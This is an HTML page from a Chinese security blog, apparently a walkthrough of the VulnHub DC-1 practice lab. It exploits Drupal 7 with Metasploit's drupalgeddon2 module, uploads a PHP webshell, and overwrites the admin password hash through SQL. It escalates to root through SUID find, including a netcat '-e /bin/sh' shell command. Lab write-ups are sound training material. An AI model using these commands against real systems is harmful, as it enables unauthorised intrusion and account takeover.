@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="靶机渗透记录—DC-1下载地址https://www.vulnhub.com/entry/dc-1,292/ 靶机描述123456789101112131415161718192021222324252627282930313233DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining exper">
+<meta name="keywords" content="渗透测试,靶机渗透,DC-1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透记录—DC-1">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/靶机渗透记录—DC-1/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="靶机渗透记录—DC-1下载地址https://www.vulnhub.com/entry/dc-1,292/ 靶机描述123456789101112131415161718192021222324252627282930313233DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining exper">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://images.5666888.xyz//20200423084000.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423084213.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423084343.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423085001.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423085302.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423090843.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423091155.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423092223.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423092639.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423092725.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423093007.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423093118.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423093131.png">
+<meta property="og:image" content="http://yoursite.com/2020/05/26/靶机渗透记录—DC-1/C:/Users/Admin/AppData/Roaming/Typora/typora-user-images/image-20200423093509256.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423094340.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423094507.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423094751.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423095103.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423100219.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423100333.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423100542.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423100712.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423101232.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423101321.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423101351.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423101656.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423101716.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423103827.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423103856.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423125125.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423125549.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200423130045.png">
+<meta property="og:updated_time" content="2020-05-26T02:36:26.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透记录—DC-1">
+<meta name="twitter:description" content="靶机渗透记录—DC-1下载地址https://www.vulnhub.com/entry/dc-1,292/ 靶机描述123456789101112131415161718192021222324252627282930313233DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining exper">
+<meta name="twitter:image" content="http://images.5666888.xyz//20200423084000.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/26/靶机渗透记录—DC-1/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>靶机渗透记录—DC-1 | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/靶机渗透记录—DC-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透记录—DC-1
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-05-26 10:35:00 / Modified: 10:36:26" itemprop="dateCreated datePublished" datetime="2020-05-26T10:35:00+08:00">2020-05-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="靶机渗透记录—DC-1"><a href="#靶机渗透记录—DC-1" class="headerlink" title="靶机渗透记录—DC-1"></a>靶机渗透记录—DC-1</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a></p>
+<h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</span><br><span class="line"></span><br><span class="line">To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</span><br><span class="line"></span><br><span class="line">There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</span><br><span class="line"></span><br><span class="line">There are five flags in total, but the ultimate goal is to find and read the flag in root&apos;s home directory. You don&apos;t even need to be root to do this, however, you will require root privileges.</span><br><span class="line"></span><br><span class="line">Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</span><br><span class="line"></span><br><span class="line">Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line"></span><br><span class="line">描述</span><br><span class="line"></span><br><span class="line">DC-1是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">它的设计初学者是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。</span><br><span class="line"></span><br><span class="line">要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。</span><br><span class="line"></span><br><span class="line">有多种获得根的方法，但是，我包括了一些标志，这些标志包含了初学者的线索。</span><br><span class="line"></span><br><span class="line">总共有五个flag，但是最终目标是在root的主目录中找到并读取该标志。您甚至不需要成为root用户即可执行此操作，但是，您将需要root特权。</span><br><span class="line"></span><br><span class="line">根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获得root资格。</span><br><span class="line"></span><br><span class="line">初学者可能会遇到以前从未遇到过的挑战，但是Google搜索应该是获得完成此挑战所需信息所需要的全部。</span><br></pre></td></tr></table></figure>
+<h2 id="打开靶机"><a href="#打开靶机" class="headerlink" title="打开靶机"></a>打开靶机</h2><p><img src="http://images.5666888.xyz//20200423084000.png" alt></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -n 192.168.191.0/24</span><br></pre></td></tr></table></figure>
+<p>扫到了一个<code>192.168.191.132</code></p>
+<p>探测一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n 192.168.191.132</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200423084213.png" alt></p>
+<p>在加个版本探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.191.132</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200423084343.png" alt></p>
+<p>探测到了22 80 111端口 </p>
+<p>80端口是web服务 使用的是Drupal 7内容管理框架 一会可以直接去查一下这个cms的漏洞</p>
+<p>先去访问一下web服务看一下</p>
+<p><img src="http://images.5666888.xyz//20200423085001.png" alt></p>
+<p>有登录有注册 功能很丰富  </p>
+<h2 id="Msf-Getshell"><a href="#Msf-Getshell" class="headerlink" title="Msf Getshell"></a>Msf Getshell</h2><p>去msf查一下看有没有相关的漏洞</p>
+<p><code>search drupal</code></p>
+<p><img src="http://images.5666888.xyz//20200423085302.png" alt></p>
+<p>最新的一个是<code>2019-02-20</code>  的<code>Drupal RESTful Web Services unserialize() RCE</code></p>
+<p> 去百度一下这个用法 发现这个用法主要是针对8.6.x的</p>
+<p>再去看看2018-03-28的那个exp 发现他正是针对Drupal 7的</p>
+<p>那么来利用一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_restws_unserialize) &gt; use  exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.191.132</span><br><span class="line">rhosts =&gt; 192.168.191.132</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.191.128:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.191.132</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.191.128:4444 -&gt; 192.168.191.132:58489) at 2020-04-23 09:07:24 +0800</span><br></pre></td></tr></table></figure>
+<p>返回了一个session  利用成功了</p>
+<p>查看一下根目录文件 看到第一个flag</p>
+<p><img src="http://images.5666888.xyz//20200423090843.png" alt></p>
+<p>老规矩 先上一个大马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; upload /home/x.php /var/www/x.php</span><br><span class="line">[*] uploading  : /home/x.php -&gt; /var/www/x.php</span><br><span class="line">[*] Uploaded -1.00 B of 85.50 KiB (-0.0%): /home/x.php -&gt; /var/www/x.php</span><br><span class="line">[*] uploaded   : /home/x.php -&gt; /var/www/x.php</span><br></pre></td></tr></table></figure>
+<p>直接在根目录传上去了</p>
+<h2 id="第一个FLAG"><a href="#第一个FLAG" class="headerlink" title="第一个FLAG"></a>第一个FLAG</h2><p>看看第一个flag内容</p>
+<p><img src="http://images.5666888.xyz//20200423091155.png" alt></p>
+<h2 id="第二个FLAG"><a href="#第二个FLAG" class="headerlink" title="第二个FLAG"></a>第二个FLAG</h2><p>提示每一个好的cms都有一个配置文件 </p>
+<p>那flag2应该就在当前目录下</p>
+<p><img src="http://images.5666888.xyz//20200423092223.png" alt></p>
+<p>用grep命令查询一下字符串</p>
+<p> <code>grep -rn &quot;flag2&quot; *</code></p>
+<p> * : 表示当前目录所有文件，也可以是某个文件名</p>
+<p> -r 是递归查找</p>
+<p> -n 是显示行号</p>
+<p>查询当前目录下带有flag2字符串的文件</p>
+<p><img src="http://images.5666888.xyz//20200423092639.png" alt></p>
+<p>在sites/default/settings.php里的第五行</p>
+<p><img src="http://images.5666888.xyz//20200423092725.png" alt></p>
+<p>翻译过来是</p>
+<p>暴力和字典攻击并不是获得访问权限的唯一方法（而且您需要访问权限）。</p>
+<p>你能用这些证件做什么？</p>
+<h2 id="第三个FLAG"><a href="#第三个FLAG" class="headerlink" title="第三个FLAG"></a>第三个FLAG</h2><p>flag2后面还有数据库配置信息</p>
+<p><img src="http://images.5666888.xyz//20200423093007.png" alt></p>
+<p>根据配置信息用大马连接一下</p>
+<p><img src="http://images.5666888.xyz//20200423093118.png" alt></p>
+<p><img src="http://images.5666888.xyz//20200423093131.png" alt></p>
+<p>在users表里发现admin账号和密码 不过密码被加密了</p>
+<p><img src="/2020/05/26/靶机渗透记录—DC-1/C:/Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20200423093509256.png" alt="image-20200423093509256"></p>
+<p>想到一个操作 我自己注册一个用户 把密码改成123456 看看对应的密文 然后把admin的进行替换 </p>
+<p>不妙开启了邮箱验证 没法注册了</p>
+<p>百度：drupal 7 admin用户 找到了这个文章</p>
+<p><a href="https://www.cnblogs.com/ooooo/archive/2011/11/17/2252347.html" target="_blank" rel="noopener">https://www.cnblogs.com/ooooo/archive/2011/11/17/2252347.html</a></p>
+<p>可以通过这种方式修改密码  我这里就直接拿他修改完的</p>
+<p><img src="http://images.5666888.xyz//20200423094340.png" alt></p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: <span class="string">'ilovedrupal'</span> hash: $S$Cv8Wnz0EiNg3Bi19w27wo.uITAX.dnYxbiMeYcSHIvC8TFLVdKB9</span><br></pre></td></tr></table></figure>
+<p>把这段密文放到数据库里去 在大马里直接修改</p>
+<p><img src="http://images.5666888.xyz//20200423094507.png" alt></p>
+<p>发现在图像化模式还改不了</p>
+<p>执行以下命令</p>
+<p><code>update users set pass=&quot;$S$Cv8Wnz0EiNg3Bi19w27wo.uITAX.dnYxbiMeYcSHIvC8TFLVdKB9&quot; where uid=1;</code></p>
+<p><img src="http://images.5666888.xyz//20200423094751.png" alt></p>
+<p>然后去主页登录</p>
+<p>admin:ilovedrupal</p>
+<p>登陆五次失败 被封锁ip 和文章里的境遇一样 只需要在flood表中把自己ip删除就可以了</p>
+<p><img src="http://images.5666888.xyz//20200423095103.png" alt></p>
+<p>结果并没有成功   我还是自己去生成密码吧</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh ‘123456’ &gt; new_pwd.txt</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200423100219.png" alt></p>
+<p>去数据库更改一下</p>
+<p><code>update users set pass=&quot;$S$D9HhB.iBgU79snkBdA3SoU5fWCpoq.lwG4KI45dorpCrVcwfz5tU&quot; where uid=1;</code></p>
+<p><img src="http://images.5666888.xyz//20200423100333.png" alt></p>
+<p>改了之后还是无法登录  我只能回msf 然后进入mysql看看了</p>
+<p>在msf里获取一个交互式shell</p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>然后登陆mysql</p>
+<p><img src="http://images.5666888.xyz//20200423100542.png" alt></p>
+<p>修改密码</p>
+<p><img src="http://images.5666888.xyz//20200423100712.png" alt></p>
+<p>依然无法登录</p>
+<p>继续百度 </p>
+<p>找到了这篇文章</p>
+<p><a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
+<p><img src="http://images.5666888.xyz//20200423101232.png" alt></p>
+<p>恍然大悟 貌似是后面的密码不能加引号  欲哭无泪</p>
+<p>重新生成密码并更改</p>
+<p><img src="http://images.5666888.xyz//20200423101321.png" alt></p>
+<p><code>update users set pass=&quot;$S$DdvYpYrfazNqZYgfFLyOpw7V.OkN3UpMvQ49Qxw56OhHYdb9T5N3&quot; where uid=1;</code></p>
+<p><img src="http://images.5666888.xyz//20200423101351.png" alt></p>
+<p>登陆成功！！</p>
+<p><img src="http://images.5666888.xyz//20200423101656.png" alt></p>
+<p><img src="http://images.5666888.xyz//20200423101716.png" alt></p>
+<h2 id="第四个FLAG"><a href="#第四个FLAG" class="headerlink" title="第四个FLAG"></a>第四个FLAG</h2><p>flag3的内容翻译过来</p>
+<p>特殊的perms将有助于find passwd，但您需要执行该命令来确定如何获取阴影中的内容。</p>
+<p>先看一下 passwd</p>
+<p><code>cat /etc/passwd</code></p>
+<p>看到flag4用户 去他的文件夹找到了flag4.txt</p>
+<p><img src="http://images.5666888.xyz//20200423103827.png" alt></p>
+<p><img src="http://images.5666888.xyz//20200423103856.png" alt></p>
+<p>内容翻译过来</p>
+<p> 您可以使用相同的方法在根目录中查找或访问标志吗？ </p>
+<p> 可能。但也许不是那么容易。或许是这样？ </p>
+<h2 id="第五个FLAG"><a href="#第五个FLAG" class="headerlink" title="第五个FLAG"></a>第五个FLAG</h2><p>flag3的线索还没有全部使用</p>
+<p>特殊的perms将有助于find passwd，但您需要执行该命令来确定如何获取shadow中的内容。</p>
+<p>这里想到了SUID提权</p>
+<p>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。 </p>
+<p>已知的可用来提权的linux可行性的文件列表如下：</p>
+<ul>
+<li>nmap</li>
+<li>vim</li>
+<li>find</li>
+<li>bash</li>
+<li>more</li>
+<li>less</li>
+<li>nano</li>
+<li>cp</li>
+</ul>
+<p>参考文章：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p>发现find是具有root用户权限的SUID文件 </p>
+<p><img src="http://images.5666888.xyz//20200423125125.png" alt></p>
+<p><code>/usr/bin/find examples.desktop -exec whoami \;</code></p>
+<p><img src="http://images.5666888.xyz//20200423125549.png" alt></p>
+<p>利用nc创建个shell</p>
+<p><code>find test -exec netcat -lvp 8888 -e /bin/sh \;</code></p>
+<p>再开一个终端直接连接  拿到最后一个flag</p>
+<p><img src="http://images.5666888.xyz//20200423130045.png" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.信息搜集还是发挥了很大作用</p>
+<p>2.遇到问题百度，在修改admin密码环节多亏了百度</p>
+<p>3.suid提权是个好东西</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/靶机渗透/" rel="tag"># 靶机渗透</a>
+          
+            <a href="/tags/DC-1/" rel="tag"># DC-1</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/26/靶机渗透记录—Lampiao/" rel="next" title="靶机渗透记录—Lampiao">
+                <i class="fa fa-chevron-left"></i> 靶机渗透记录—Lampiao
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/17/物联网考试/" rel="prev" title="物联网考试">
+                物联网考试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
